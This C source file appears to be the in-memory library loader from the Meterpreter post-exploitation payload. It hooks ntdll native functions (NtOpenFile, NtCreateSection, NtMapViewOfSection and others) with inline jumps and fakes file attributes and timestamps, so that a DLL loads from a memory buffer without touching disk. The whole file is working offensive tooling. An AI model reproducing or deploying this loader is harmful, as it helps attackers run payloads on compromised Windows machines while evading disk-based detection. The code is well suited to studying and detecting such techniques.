/*
 * libloader -- In-Memory Remote Library Injection shellcode
 * Jarkko Turkulainen <jt[at]klake.org>
 *
 * Platforms: Windows NT4/2000/XP/2003
 *
 * Credits:
 *
 * - skape for ideas, nologin, Metasploit
 *
 *
 * ----
 *
 * This is a modified version of the original that has been slightly changed 
 * in order to integrate it with meterpreter. 
 */
#include "metsrv.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>

#include "libloader.h"

/* NTSTATUS values */
#define STATUS_SUCCESS 			0x00000000
#define STATUS_IMAGE_NOT_AT_BASE	0x40000003

/* Time values */
#define	HIGH_TIME	0x01C422FA
#define LOW_TIME_1	0x7E275CE0
#define LOW_TIME_2	0x8E275CE0

/* Some defines ripped off from DDK */
typedef struct _FILE_BASIC_INFORMATION {
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef enum _SECTION_INFORMATION_CLASS {
	SectionBasicInformation,
	SectionImageInformation
} SECTION_INFORMATION_CLASS;

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct _IO_STATUS_BLOCK {
	NTSTATUS Status;
	ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer;
#else
	PWSTR  Buffer;
#endif
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _ANSI_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} ANSI_STRING, *PANSI_STRING, STRING, *PSTRING;

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI *f_NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *f_NtQueryAttributesFile)(POBJECT_ATTRIBUTES, PFILE_BASIC_INFORMATION);
typedef void (NTAPI *f_NtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, 
		PIO_STATUS_BLOCK, ULONG ShareAccess, ULONG);
typedef NTSTATUS (NTAPI *f_NtCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
		ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *f_NtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG, ULONG,
		PLARGE_INTEGER, PULONG, SECTION_INHERIT, ULONG, ULONG);

typedef struct _SHELLCODE_CTX {

	/* Library name */
	char				libname[256];
	int				liblen;
	/* Global offset */
	DWORD				offset;
	/* Allocated memory sections */
	DWORD				file_address;
	DWORD				mapped_address;

	/* Hook stub functions */
	unsigned char			s_NtOpenSection[10];
	unsigned char			s_NtQueryAttributesFile[10];
	unsigned char			s_NtOpenFile[10];
	unsigned char			s_NtCreateSection[10];
	unsigned char			s_NtMapViewOfSection[10];

	/* Hooked functions */
	DWORD				NtOpenSection;
	DWORD				NtQueryAttributesFile;
	DWORD				NtOpenFile;
	DWORD				NtCreateSection;
	DWORD				NtMapViewOfSection;

	f_NtOpenSection			p_NtOpenSection;
	f_NtQueryAttributesFile		p_NtQueryAttributesFile;
	f_NtOpenFile			p_NtOpenFile;
	f_NtCreateSection		p_NtCreateSection;
	f_NtMapViewOfSection		p_NtMapViewOfSection;
} SHELLCODE_CTX;

SHELLCODE_CTX *ctx = NULL;

#pragma comment(lib, "ws2_32.lib")

#pragma warning(disable: 4068)

/*
 * Find library name from given unicode string
 */
int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str) 
{
	int i, j;

	for (i = 0; i < str->Length; i++) 
	{
		for (j = 0; j < ctx->liblen; j++) 
		{
			if (str->Buffer[i + j] != ctx->libname[j])
				break;
		}

		/* Match */
		if (j == ctx->liblen) 
			return 0;
	}

	return 1;
}

/* NtOpenSection hook */
NTSTATUS NTAPI m_NtOpenSection(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes) 
{
	/* Find our context */
	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
	{
		*SectionHandle = (PHANDLE)ctx->mapped_address;
		return STATUS_SUCCESS;
	}

	return ctx->p_NtOpenSection(SectionHandle, DesiredAccess, 
		ObjectAttributes);
}

/* NtQueryAttributesFile hook */
NTSTATUS NTAPI m_NtQueryAttributesFile(
	POBJECT_ATTRIBUTES ObjectAttributes,
	PFILE_BASIC_INFORMATION FileAttributes) 
{
	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
	{
		/*
		 * struct PFILE_BASIC_INFORMATION must be actually filled
		 * with something sane, otherwise it might break something.
		 * The values are defined in libloader.h
		 *
		 */
		FileAttributes->CreationTime.LowPart = LOW_TIME_1;
		FileAttributes->CreationTime.HighPart = HIGH_TIME;
		FileAttributes->LastAccessTime.LowPart = LOW_TIME_2;
		FileAttributes->LastAccessTime.HighPart = HIGH_TIME;
		FileAttributes->LastWriteTime.LowPart = LOW_TIME_1;
		FileAttributes->LastWriteTime.HighPart = HIGH_TIME;
		FileAttributes->ChangeTime.LowPart = LOW_TIME_1;
		FileAttributes->ChangeTime.HighPart = HIGH_TIME;
		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL; 
		return STATUS_SUCCESS;
	}
	
	return ctx->p_NtQueryAttributesFile(ObjectAttributes, FileAttributes);
}

/* NtOpenFile hook */
void NTAPI m_NtOpenFile(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG ShareAccess,
	ULONG OpenOptions) 
{
	if (!find_string(ctx, ObjectAttributes->ObjectName)) 
	{
		*FileHandle = (PVOID)ctx->mapped_address;
		return;
	}

	ctx->p_NtOpenFile(
		FileHandle,
		DesiredAccess,
		ObjectAttributes,
		IoStatusBlock,
		ShareAccess,
		OpenOptions);

	return;
}

/* NtCreateSection hook */
NTSTATUS NTAPI m_NtCreateSection(
	PHANDLE SectionHandle, 
	ULONG DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG PageAttributes,
	ULONG SectionAttributes,
	HANDLE FileHandle) 
{
	if (FileHandle == (HANDLE)ctx->mapped_address) 
	{
		*SectionHandle = (PVOID)ctx->mapped_address;
		return STATUS_SUCCESS;	
	}

	return ctx->p_NtCreateSection(
		SectionHandle, 
		DesiredAccess, 
		ObjectAttributes,
		MaximumSize,
		PageAttributes,
		SectionAttributes,
		FileHandle);
}


/* NtMapViewOfSection hook */
NTSTATUS NTAPI m_NtMapViewOfSection(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	ULONG CommitSize,
	PLARGE_INTEGER SectionOffset,
	PULONG ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG AllocationType,
	ULONG Protect) 
{
	if (SectionHandle == (HANDLE)ctx->mapped_address) 
	{
		*BaseAddress = (PVOID)ctx->mapped_address;

		/* We assume that the image must be relocated */
		return STATUS_IMAGE_NOT_AT_BASE;
	}

	return ctx->p_NtMapViewOfSection(
		SectionHandle,
		ProcessHandle,
		BaseAddress,
		ZeroBits,
		CommitSize,
		SectionOffset,
		ViewSize,
		InheritDisposition,
		AllocationType,
		Protect);
}


/* Patch given function */
void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub, 
		unsigned char *hook) 
{
	DWORD				protect;
	ULONG 				bytes, written;
	MEMORY_BASIC_INFORMATION	mbi_thunk;

	/*
	 * Most native NT functions begin with stub like this:
	 *
	 * 00000000  B82B000000        mov eax,0x2b         ; syscall
	 * 00000005  8D542404          lea edx,[esp+0x4]    ; arguments
	 * 00000009  CD2E              int 0x2e             ; interrupt
	 *
	 * In offset 0, the actual system call is saved in eax. Syscall
	 * is 32 bit number (!) so we can assume 5 bytes of preamble size
	 * for each function.. If there's need to hook other functions,
	 * a complete disassembler is needed for preamble size counting.
	 *
	 */
	bytes = 5;

	/* Create the stub */
	WriteProcessMemory((HANDLE)-1, stub, (char *)address, 
		bytes, &written);
	*(PBYTE)(stub + bytes) = 0xE9;
	*(DWORD *)(stub + bytes + 1) = (DWORD)address - ((DWORD)stub + 5);


	/* Patch original function */

	/* Fix protection */
	VirtualQuery((char *)address, &mbi_thunk, 
		sizeof(MEMORY_BASIC_INFORMATION));
	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
		
	/* Insert jump */
	*(PBYTE)address = 0xE9;
	*(DWORD *)(address + 1) = (DWORD)hook - ((DWORD)address + 5);


	/* Restore protection */
	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		mbi_thunk.Protect, &protect);
	FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
		mbi_thunk.RegionSize);

}

/* Install hooks, fix addresses */
void install_hooks(SHELLCODE_CTX *ctx) 
{
	f_NtMapViewOfSection lNtMapViewOfSection;
	f_NtQueryAttributesFile lNtQueryAttributesFile;
	f_NtOpenFile lNtOpenFile;
	f_NtCreateSection lNtCreateSection;
	f_NtOpenSection lNtOpenSection;
	HMODULE ntdll;

	if (!(ntdll = LoadLibrary("ntdll")))
		return;

	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll,
			"NtMapViewOfSection");
	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddress(ntdll,
			"NtQueryAttributesFile");
	lNtOpenFile = (f_NtOpenFile)GetProcAddress(ntdll,
			"NtOpenFile");
	lNtCreateSection = (f_NtCreateSection)GetProcAddress(ntdll,
			"NtCreateSection");
	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll,
			"NtOpenSection");

	/* NtMapViewOfSection */

	/* Patch */
	patch_function(ctx, (DWORD)lNtMapViewOfSection, 
		ctx->s_NtMapViewOfSection, 
		(unsigned char *)m_NtMapViewOfSection);

	/* Copy pointer */
	ctx->p_NtMapViewOfSection = 
		(f_NtMapViewOfSection)ctx->s_NtMapViewOfSection;

	/* NtQueryAttributesFile */
	patch_function(ctx, (DWORD)lNtQueryAttributesFile,
		 ctx->s_NtQueryAttributesFile, 
		(unsigned char *)m_NtQueryAttributesFile);
	ctx->p_NtQueryAttributesFile = 
		(f_NtQueryAttributesFile)ctx->s_NtQueryAttributesFile;

	/* NtOpenFile */
	patch_function(ctx, (DWORD)lNtOpenFile, ctx->s_NtOpenFile, 
		(unsigned char *)m_NtOpenFile);
	ctx->p_NtOpenFile = (f_NtOpenFile)ctx->s_NtOpenFile;

	/* NtCreateSection */
	patch_function(ctx, (DWORD)lNtCreateSection, ctx->s_NtCreateSection, 
		(unsigned char *)m_NtCreateSection);
	ctx->p_NtCreateSection = (f_NtCreateSection)ctx->s_NtCreateSection;
	
	/* NtOpenSection */
	patch_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection, 
		(unsigned char *)m_NtOpenSection);
	ctx->p_NtOpenSection = (f_NtOpenSection)ctx->s_NtOpenSection;
	
}

/* Restore given function */
void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub) 
{
	DWORD				protect;
	ULONG 				bytes, written;
	MEMORY_BASIC_INFORMATION	mbi_thunk;

	bytes = 5;

	/* Patch original function */

	/* Fix protection */
	VirtualQuery((char *)address, &mbi_thunk, 
		sizeof(MEMORY_BASIC_INFORMATION));
	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
		
	/* Copy bytes back to function */
	WriteProcessMemory((HANDLE)-1, (char *)address, stub,
		bytes, &written);

	/* Restore protection */
	VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		mbi_thunk.Protect, &protect);
	FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
		mbi_thunk.RegionSize);

}

/* Remove hooks */
void remove_hooks(SHELLCODE_CTX *ctx) 
{
	f_NtMapViewOfSection lNtMapViewOfSection;
	f_NtQueryAttributesFile lNtQueryAttributesFile;
	f_NtOpenFile lNtOpenFile;
	f_NtCreateSection lNtCreateSection;
	f_NtOpenSection lNtOpenSection;
	HMODULE ntdll;

	if (!(ntdll = LoadLibrary("ntdll")))
		return;

	lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll,
			"NtMapViewOfSection");
	lNtQueryAttributesFile = (f_NtQueryAttributesFile)GetProcAddress(ntdll,
			"NtQueryAttributesFile");
	lNtOpenFile = (f_NtOpenFile)GetProcAddress(ntdll,
			"NtOpenFile");
	lNtCreateSection = (f_NtCreateSection)GetProcAddress(ntdll,
			"NtCreateSection");
	lNtOpenSection = (f_NtOpenSection)GetProcAddress(ntdll,
			"NtOpenSection");

	/* NtMapViewOfSection */
	restore_function(ctx, (DWORD)lNtMapViewOfSection, 
		ctx->s_NtMapViewOfSection);
		
	/* NtQueryAttributesFile */
	restore_function(ctx, (DWORD)lNtQueryAttributesFile,
		 ctx->s_NtQueryAttributesFile);

	/* NtOpenFile */
	restore_function(ctx, (DWORD)lNtOpenFile, ctx->s_NtOpenFile);

	/* NtCreateSection */
	restore_function(ctx, (DWORD)lNtCreateSection, ctx->s_NtCreateSection);
	
	/* NtOpenSection */
	restore_function(ctx, (DWORD)lNtOpenSection, ctx->s_NtOpenSection);
}

/* Map file in memory as section */
void map_file(SHELLCODE_CTX *ctx) 
{
	PIMAGE_NT_HEADERS 	nt;
	PIMAGE_DOS_HEADER 	dos;
	PIMAGE_SECTION_HEADER	sect;
	int			i;
	
	dos = (PIMAGE_DOS_HEADER)ctx->file_address;
	nt = (PIMAGE_NT_HEADERS)(ctx->file_address + dos->e_lfanew);

	/* 
	 * Allocate space for the mapping
	 * First, try to map the file at ImageBase
	 *
	 */
	ctx->mapped_address = (DWORD)VirtualAlloc((PVOID)nt->OptionalHeader.ImageBase,
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	 

	/* No success, let the system decide..  */
	if (ctx->mapped_address == 0) {
		ctx->mapped_address = (DWORD)VirtualAlloc((PVOID)NULL,
			nt->OptionalHeader.SizeOfImage,
			MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	}

	/* Lock the mapping in memory */
	{
		ULONG (_stdcall *NtLockVirtualMemory)(HANDLE, PVOID *, PULONG, ULONG);

		NtLockVirtualMemory = (ULONG (_stdcall *)(HANDLE, PVOID *, PULONG, ULONG))GetProcAddress(
				GetModuleHandle("ntdll"),
				"NtLockVirtualMemory");

		if (NtLockVirtualMemory)
		{
			PVOID base = (PVOID)ctx->mapped_address;
			ULONG sz = nt->OptionalHeader.SizeOfImage;

			NtLockVirtualMemory(
					(HANDLE)-1,
					&base,
					&sz,
					1);
		}
	}

	/* Write headers */
	WriteProcessMemory((HANDLE)-1, (LPVOID)ctx->mapped_address, 
		(LPVOID)ctx->file_address, nt->OptionalHeader.SizeOfHeaders, 0);

	/* Write sections */
	sect = IMAGE_FIRST_SECTION(nt);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		WriteProcessMemory((HANDLE)-1,
			(PCHAR)ctx->mapped_address + sect[i].VirtualAddress,
			(PCHAR)ctx->file_address + sect[i].PointerToRawData,
			sect[i].SizeOfRawData, 0);
	}

}

/*
 * Load a library in-memory from the provided buffer.
 */
HMODULE libloader_load_library(LPCSTR name, PUCHAR buffer, DWORD bufferLength)
{
	LPCSTR shortName = name, slash = NULL;
	SHELLCODE_CTX *lctx;
	HMODULE mod = NULL;

	lctx = (SHELLCODE_CTX *)VirtualAlloc(NULL, sizeof(SHELLCODE_CTX), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!lctx)
		return NULL;

	if ((slash = strrchr(name, '\\')))
		shortName = slash+1;

	memset(lctx, 0, sizeof(lctx));

	ctx = lctx;

	install_hooks(ctx);

	do
	{
		// The name of the library to load it as
		strncpy(ctx->libname, shortName, sizeof(ctx->libname));
		ctx->liblen = strlen(ctx->libname) + 1;

		// The address of the raw buffer
		ctx->file_address = (DWORD)buffer;

		// Map the buffer into memory
		map_file(ctx);

		// Load the fake library
		if (!(mod = LoadLibrary(ctx->libname)))
			break;

	} while (0);

	remove_hooks(ctx);

	VirtualFree(lctx, sizeof(SHELLCODE_CTX), MEM_RELEASE);

	ctx = NULL;

	return mod;
}
